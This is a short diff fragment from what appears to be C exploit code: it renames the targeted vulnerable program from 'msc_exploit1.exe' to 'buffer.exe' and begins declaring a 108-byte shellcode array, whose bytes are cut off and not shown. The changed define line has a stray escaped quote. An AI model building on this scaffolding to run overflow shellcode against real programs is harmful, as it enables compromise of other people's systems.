@@ -8,7 +8,7 @@
 
 //path to defect application
 
-#define BAD_APP "msc_exploit1.exe\"
+#define BAD_APP "buffer.exe\"
 
 //shellcode in heksdecymal form  without null values
 unsigned char shellcode[108]=
